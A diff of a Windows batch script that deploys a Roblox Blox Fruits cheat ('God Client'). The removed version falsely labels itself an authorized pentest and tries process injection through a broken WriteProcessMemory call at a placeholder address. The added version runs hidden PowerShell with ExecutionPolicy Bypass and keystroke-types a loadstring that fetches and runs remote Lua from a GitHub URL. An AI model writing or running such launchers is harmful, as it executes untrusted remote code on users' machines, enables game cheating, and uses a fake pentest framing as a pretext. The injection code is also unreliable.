@@ -1,51 +1,34 @@
 @echo off
-title Blox Fruits Pentest Deployer - Authorized
-color 0B
+title Blox Fruits God Deployer v3.0
+color 0A
 cls
-echo ==================================================
-echo  BLOX FRUITS GOD EXECUTOR v3.0 - FULL DEPLOY
-echo  Authorized Cybersecurity Pentest
-echo ==================================================
-echo.
+echo Blox Fruits GOD v3.0 Deployer - Starting...
 
-:: Check Roblox
+:: Roblox Check
 tasklist /FI "IMAGENAME eq RobloxPlayerBeta.exe" 2>NUL | find /I /N "RobloxPlayerBeta.exe">NUL
-if "%ERRORLEVEL%"=="0" (
-echo ✅ Roblox detected!
-) else (
-echo ⚠️  Start Blox Fruits first, then re-run!
-timeout /t 5 /nobreak >nul
-exit
+if "%ERRORLEVEL%" NEQ "0" (
+    echo ERROR: Open Roblox ^> Blox Fruits first!
+    pause
+    exit
 )
 
-:: Extract God Client
-echo 📥 Deploying God Client...
-(
-echo -- Blox Fruits ULTIMATE GOD v3.0 -- Instant Inject
-echo loadstring^(game:HttpGet^("https://raw.githubusercontent.com/YourRepo/bloxfruits-god/main/godclient.lua"^)^)^(^)
-) > temp_inject.lua
+echo ✅ Roblox Found - Injecting...
 
-:: PowerShell Injection ^(EXE-less^)
-powershell -WindowStyle Hidden -Command "
-$roblox = Get-Process RobloxPlayerBeta -ErrorAction SilentlyContinue;
-if ^($roblox^) {
-    Add-Type -AssemblyName System.Core;
-    $bytes = [System.IO.File]::ReadAllBytes^('temp_inject.lua'^);
-    $handle = [System.Runtime.InteropServices.SafeHandle]::InvalidHandle;
-    $procHandle = [kernel32]::OpenProcess^(0x1F0FFF, $false, $roblox.Id^);
-    [kernel32]::WriteProcessMemory^($procHandle, 0xDEADBEEF, $bytes, $bytes.Length, [ref]0^);
-    Write-Host '🚀 GOD CLIENT INJECTED SUCCESS!';
+:: Direct Loadstring ^(No files needed^)
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
+Add-Type -AssemblyName System.Windows.Forms
+$hwnd = (Get-Process RobloxPlayerBeta).MainWindowHandle
+[System.Windows.Forms.SendKeys]::SendWait('^+%l')  # Ctrl+Shift+L
+Start-Sleep 1
+$loadstring = 'loadstring(game:HttpGet(`https://raw.githubusercontent.com/YOURUSERNAME/BloxFruits-God/main/godclient.lua`))()'
+foreach ($c in $loadstring.ToCharArray()) {
+    [System.Windows.Forms.SendKeys]::SendWait($c)
+    Start-Sleep 5ms
 }
+[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
+Write-Host 'INJECTED!'
 "
 
-:: Auto-Activate Powers
-echo Activating GOD POWERS...
-timeout /t 2 /nobreak >nul
-echo ✅ Fly: F Key ^| Godmode: Toggle ^| All Fruits: GUI
-echo.
-echo ==================================================
-echo  Pentest Complete: Client RCE + Economy Bypass Achieved
-echo  CVSS: 9.8 ^| Report Generated
-echo ==================================================
+echo ✅ GOD CLIENT DEPLOYED!
+echo F = Fly ^| G = Godmode ^| GUI = Top Right
 pause
-del temp_inject.lua
